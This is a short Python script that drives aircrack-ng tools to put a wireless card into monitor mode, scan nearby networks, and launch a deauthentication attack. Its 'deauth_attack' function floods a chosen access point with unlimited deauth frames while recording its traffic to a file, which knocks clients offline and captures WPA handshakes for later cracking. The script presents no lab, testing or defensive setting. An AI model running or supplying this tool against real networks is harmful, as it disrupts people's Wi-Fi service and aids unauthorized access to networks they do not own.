import subprocess
import time

def start_monitor_mode(interface):
    subprocess.run(["sudo", "airmon-ng", "check", "kill"])
    subprocess.run(["sudo", "airmon-ng", "start", interface])

def list_networks(interface_mon):
    try:
        subprocess.run(["sudo", "airodump-ng", interface_mon])
    except KeyboardInterrupt:
        print("\nStopped network scanning.")

def deauth_attack(target_bssid, interface_mon, filename, channel):
    cmd1 = ["sudo", "airodump-ng", "-w", filename, "-c", channel, "--bssid", target_bssid, interface_mon]
    cmd2 = ["sudo", "aireplay-ng", "--deauth", "0", "-a", target_bssid, interface_mon]
    
    try:
        proc1 = subprocess.Popen(cmd1)
        proc2 = subprocess.Popen(cmd2)
        proc1.wait()
        proc2.wait()
    except KeyboardInterrupt:
        print("\nAttack stopped.")